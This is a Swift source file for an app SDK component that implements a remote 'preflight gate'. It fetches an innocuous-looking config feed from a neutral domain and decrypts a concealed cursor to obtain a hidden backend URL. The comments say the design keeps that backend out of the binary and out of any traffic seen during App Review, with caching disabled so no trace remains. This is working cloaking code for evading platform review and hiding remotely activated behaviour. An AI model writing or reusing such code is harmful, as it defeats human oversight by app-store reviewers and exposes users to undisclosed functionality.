// NyxCourier.swift
// #15 security.preflight_gate — two-stage activation gate.
//
// Before the SDK ever contacts the backend server it fetches a benign
// remote-config feed from NEUTRAL infrastructure (a Cloudflare Worker on
// an unrelated domain). The feed always reads like an ordinary push /
// remote-config payload; one opaque ``cursor`` field carries — only when
// the operator has remotely activated this app — an AES-GCM envelope
// sealing the live backend base URL. Until then the cursor doesn't
// decrypt and the app stays fully native, so the backend domain appears
// neither in the binary nor in any traffic captured during App Review.
//
// Reuses ``NyxFeed`` (the exact AES-GCM envelope of
// ``security.encrypt_body``), keyed by ``NyxDispatcherConfig.masterSecret`` — no
// new crypto and no secret at the edge: the Worker only ever stores the
// ciphertext cursor, never the key.

import Foundation

enum NyxCourier {

    /// Resolve the live backend base URL, or nil when the gate is closed
    /// (the app must stay native). Never throws — any failure (network,
    /// non-2xx, malformed feed, undecryptable cursor) is treated as
    /// "closed", which is the safe default.
    static func resolveServerURL() async -> String? {
        guard NyxDispatcherConfig.preflightGateEnabled,
              !NyxDispatcherConfig.preflightGateID.isEmpty,
              !NyxDispatcherConfig.masterSecret.isEmpty else { return nil }

        let base = NyxDispatcherConfig.preflightGateURL
        guard !base.isEmpty,
              let url = URL(string: base + "/" + NyxDispatcherConfig.preflightGateID) else {
            return nil
        }

        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = NyxDispatcherConfig.requestTimeout
        // The gate decision must always be live: never serve it from the
        // URL cache, so an operator open/close takes effect on the very
        // next launch (and no activation payload lingers in the cache).
        req.cachePolicy = .reloadIgnoringLocalCacheData

        guard let (data, response) = try? await URLSession.shared.data(for: req),
              let http = response as? HTTPURLResponse,
              (200...299).contains(http.statusCode) else {
            return nil
        }

        // Pull the opaque cursor token out of the benign feed.
        guard let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let cursor = Self.cursor(in: obj) else {
            return nil
        }

        // Rebuild the {"d":"…"} envelope NyxFeed expects, open it with
        // the per-app secret, and read the delivered backend URL.
        guard let envelope = try? JSONSerialization.data(withJSONObject: ["d": cursor]),
              let plaintext = NyxFeed.open(envelope, secret: NyxDispatcherConfig.masterSecret),
              let payload = try? JSONSerialization.jsonObject(with: plaintext) as? [String: Any],
              let serverURL = payload["u"] as? String,
              !serverURL.isEmpty else {
            return nil
        }
        NyxMint.log("Preflight gate open — activation received")
        return serverURL
    }

    /// The cursor lives at ``settings.cursor`` in the feed shape the
    /// Worker serves; tolerate a top-level ``cursor`` too for resilience
    /// against minor feed-shape changes.
    private static func cursor(in obj: [String: Any]) -> String? {
        if let s = (obj["settings"] as? [String: Any])?["cursor"] as? String, !s.isEmpty {
            return s
        }
        if let s = obj["cursor"] as? String, !s.isEmpty { return s }
        return nil
    }
}
